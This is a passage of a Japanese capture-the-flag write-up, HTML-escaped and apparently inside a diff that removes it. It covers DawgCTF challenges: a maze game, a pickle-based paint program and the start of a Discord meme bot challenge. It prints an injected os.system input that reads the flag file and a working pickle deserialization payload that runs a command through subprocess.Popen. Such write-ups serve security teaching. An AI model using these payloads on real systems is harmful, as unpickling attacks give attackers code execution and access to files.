-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        vis &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; w &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; [&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; _ &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(h)] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; [[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; (w &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)]
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        ver &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;|  &amp;#34;&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; w &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; [&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;|&amp;#39;&lt;/span&gt;] &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; _ &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(h)] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; [[]]
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        hor &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;+--&amp;#34;&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; w &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; [&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;+&amp;#39;&lt;/span&gt;] &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; _ &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(h &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)]
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;walk&lt;/span&gt;(x, y):
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                vis[y][x] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                d &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [(x &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, y), (x, y &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;), (x &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, y), (x, y &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)]
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                shuffle(d)
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (xx, yy) &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; d:
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; vis[yy][xx]: &lt;span style=&#34;color:#66d9ef&#34;&gt;continue&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; xx &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; x: hor[max(y, yy)][x] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;+  &amp;#34;&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; yy &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; y: ver[y][max(x, xx)] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;   &amp;#34;&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                        walk(xx, yy)
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        walk(randrange(w), randrange(h))
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        s &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (a, b) &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; zip(hor, ver):
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                s &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;join(a &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; [&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; b &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; [&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;])
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        s &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;replace(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34; &amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;O&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;)
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        s &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; replace_last(s, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;  &amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;FF&amp;#34;&lt;/span&gt;)
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; s
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;__main__&lt;/span&gt;():
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        welcome()
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        still_playing &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        maze &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; make_maze()
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt;(still_playing):
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                still_playing &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; make_move(maze)
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        print &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Congrats! You&amp;#39;ve finished the maze! Here&amp;#39;s your flag:&amp;#34;&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        os&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;system(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/bin/cat flag.txt&amp;#34;&lt;/span&gt;)
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;__main__()
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;code&gt;__main__()&lt;/code&gt;関数を見ると&lt;code&gt;os.system(&amp;quot;/bin/cat flag.txt&amp;quot;)&lt;/code&gt;とあるので、そのまま&lt;code&gt;make_move(os.system(&amp;quot;/bin/cat flag.txt&amp;quot;))&lt;/code&gt;を渡すとフラグが得られます。&lt;/p&gt;
-&lt;h2 id=&#34;jellyspotters&#34;&gt;Jellyspotters&lt;/h2&gt;
-&lt;h3 id=&#34;問題-1&#34;&gt;問題&lt;/h3&gt;
-&lt;p&gt;&lt;strong&gt;100 points&lt;/strong&gt;&lt;br&gt;
-The leader of the Jellyspotters has hired you to paint them a poster for their convention, using this painting program. Also, the flag is in ~/flag.txt.&lt;/p&gt;
-&lt;p&gt;nc umbccd.io 4200&lt;/p&gt;
-&lt;p&gt;Author: nb&lt;/p&gt;
-&lt;h3 id=&#34;解説-1&#34;&gt;解説&lt;/h3&gt;
-&lt;p&gt;ncコマンドで接続すると描画プログラムのシェルのようなものがあります。helpを確認して少し操作してみると以下のようになります。&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Welcome to the Paint Program!
-Paint us a new poster for the Jellyspotters 2021 convention. Make Kevin proud.
-Type &amp;#39;help&amp;#39; for help.
-&amp;gt; help
-Listing commands...
-display             Display the canvas
-clearall            Clear the canvas
-set [row] [col]     Set a particular pixel
-clear [row] [col]   Clear a particular pixel
-export              Export the canvas state
-import [canvas]     Import a previous canvas
-exit                Quit the program
-&amp;gt; display
-##################
-#                #
-#                #
-#                #
-#                #
-#                #
-#                #
-#                #
-#                #
-#                #
-#                #
-#                #
-#                #
-#                #
-#                #
-#                #
-#                #
-##################
-&amp;gt; set 5 5
-##################
-#                #
-#                #
-#                #
-#                #
-#                #
-#     0          #
-#                #
-#                #
-#                #
-#                #
-#                #
-#                #
-#                #
-#                #
-#                #
-#                #
-##################
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;exportとimportは以下のような使い方ができます。表示形式はBase64のようですが、デコードしてもそのまま読めるような形にはなりませんでした。&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;gt; export
-Exported canvas string:
-gASVSQIAAAAAAABdlChdlCiMASCUaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCZV2UKGgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCZV2UKGgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCZV2UKGgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCZV2UKGgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCZV2UKGgCaAJoAmgCaAKMATCUaAJoAmgCaAJoAmgCaAJoAmgCaAJlXZQoaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJlXZQoaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJlXZQoaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJlXZQoaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJlXZQoaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJlXZQoaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJlXZQoaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJlXZQoaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJlXZQoaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJlXZQoaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJlZS4=
-&amp;gt; import gASVSQIAAAAAAABdlChdlCiMASCUaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCZV2UKGgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCZV2UKGgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCZV2UKGgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCZV2UKGgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCZV2UKGgCaAJoAmgCaAKMATCUaAJoAmgCaAJoAmgCaAJoAmgCaAJlXZQoaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJlXZQoaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJlXZQoaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJlXZQoaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJlXZQoaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJlXZQoaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJlXZQoaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJlXZQoaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJlXZQoaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJlXZQoaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJlZS4=
-Importing...
-Done!
-##################
-#                #
-#                #
-#                #
-#                #
-#                #
-#     0          #
-#                #
-#                #
-#                #
-#                #
-#                #
-#                #
-#                #
-#                #
-#                #
-#                #
-##################
-&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;何かヒントが欲しいのでimportでエラーを吐きそうな適当な引数を渡します。&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;gt; import a
-Importing...
-Traceback (most recent call last):
-  File &amp;#34;/home/challuser/jellyspotters.py&amp;#34;, line 67, in &amp;lt;module&amp;gt;
-    imp = pickle.loads(base64.b64decode(split[1]))
-  File &amp;#34;/usr/lib/python3.8/base64.py&amp;#34;, line 87, in b64decode
-    return binascii.a2b_base64(s)
-binascii.Error: Invalid base64-encoded string: number of data characters (1) cannot be 1 more than a multiple of 4
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Pythonでpickleを使ってPythonオブジェクトを変換しBase64エンコードをしているみたいなので、ローカルで同じことをすればPythonオブジェクトに復元したり、好きなPythonオブジェクトをimportで渡したりできそうです。&lt;br&gt;
-復元してみると二次元リストだということが分かるので、以下のコードで適当なデータでBase64文字列を作り、渡してみます。&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; pickle
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; base64
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;data &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    [&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;a&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;b&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;c&amp;#34;&lt;/span&gt;],
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    [&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;d&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;e&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;f&amp;#34;&lt;/span&gt;],
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;]
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;p &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; pickle&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;dumps(data)
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;print(base64&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;b64encode(p))
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;出力&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;b&amp;#39;gASVJQAAAAAAAABdlChdlCiMAWGUjAFilIwBY5RlXZQojAFklIwBZZSMAWaUZWUu&amp;#39;
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;importに渡してみるとこうなります。&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;gt; import gASVJQAAAAAAAABdlChdlCiMAWGUjAFilIwBY5RlXZQojAFklIwBZZSMAWaUZWUu
-Importing...
-Done!
-##################
-#abc#
-#def#
-##################
-&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;どうにかして内部のファイルを出力するような関数を実行させたいところですが、静的なオブジェクトしか渡せないのでどうすればよいか考えました。考えても思いつかなかったので「pickle vulnerability」とかで検索すると任意コード実行の脆弱性(参考: &lt;a href=&#34;https://blog.nelhage.com/2011/03/exploiting-pickle/&#34;&gt;https://blog.nelhage.com/2011/03/exploiting-pickle/&lt;/a&gt;)がありました。&lt;br&gt;
-これを利用して以下のコードを書いて出力をimportに渡せばフラグが得られます。&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; pickle
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; base64
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; subprocess
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;RunShell&lt;/span&gt;(object):
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;__reduce__&lt;/span&gt;(self):
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; (subprocess&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;Popen, ((&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;cat&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;flag.txt&amp;#39;&lt;/span&gt;),))
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;r &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; RunShell()
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;p &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; pickle&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;dumps(r)
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;print(base64&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;b64encode(p))
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;mdl-considered-harmful&#34;&gt;MDL Considered Harmful&lt;/h2&gt;
-&lt;h3 id=&#34;問題-2&#34;&gt;問題&lt;/h3&gt;
-&lt;p&gt;&lt;strong&gt;225 points&lt;/strong&gt;&lt;br&gt;
-There&amp;rsquo;s a bot named MDLChef in the Discord. You need to DM it, it doesn&amp;rsquo;t respond in the server. On its host machine, there&amp;rsquo;s a file at /opt/flag.txt - it contains the flag. Go get it.&lt;/p&gt;
-&lt;p&gt;Note: This is NOT an OSINT challenge. The source code really isn&amp;rsquo;t available. Good luck.&lt;/p&gt;
-&lt;p&gt;Author: nb&lt;/p&gt;
-&lt;h3 id=&#34;解説-2&#34;&gt;解説&lt;/h3&gt;
-&lt;p&gt;DawgCTFのDiscordサーバーにMDLChefというBotがいて、「DM me and say /help」とのことなのでDMに/helpを送ります。&lt;/p&gt;
-&lt;p&gt;以下の返信が来ます。&lt;/p&gt;
-&lt;blockquote&gt;
-&lt;p&gt;&lt;strong&gt;MDLChef Bot&lt;/strong&gt;&lt;br&gt;
-This bot generates memes using MDL, the Meme Description Language.&lt;br&gt;
-Here is an example of a valid MDL sample:&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-json&#34; data-lang=&#34;json&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;version:&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;MDL/1.1&amp;#34;&lt;/span&gt;,
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;type:&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;meme&amp;#34;&lt;/span&gt;,
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;base:&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;{&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;format:&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;Meme.Matrix.WhatIfIToldYou&amp;#34;&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;,&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;caption:&lt;/span&gt; {
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;topText:&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;what if i told you&amp;#34;&lt;/span&gt;,
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;bottomText:&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;you can code your memes&amp;#34;&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;}&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;
-&lt;p&gt;Just send a valid MDL snippet in the DM and the bot will automatically recognize it and respond.&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;p&gt;提示されたMDL sampleを送信してみるとミーム画像が返されました。&lt;br&gt;
-/helpはスラッシュコマンドだったので、/を打って候補に出る他のコマンドも試してみます。&lt;br&gt;
-/creditsを送信すると以下の返信が来ます。&lt;/p&gt;
-&lt;blockquote&gt;
-&lt;p&gt;&lt;strong&gt;Credits&lt;/strong&gt;&lt;br&gt;
-Thank you to&amp;hellip;&lt;br&gt;
-- The Rust programming language&lt;br&gt;
-- The Serenity Discord library&lt;br&gt;
-- The ImageMagick caption command for meme generation&lt;br&gt;
-Note: The source code for this bot is NOT publicly available, due to the CyberDawgs&amp;rsquo; extreme anti-open-source and pro-proprietary stance. We don&amp;rsquo;t NEED public auditing. All of the code in this bot is totally and completely secure.&lt;/p&gt;
-&lt;/blockquote&gt;
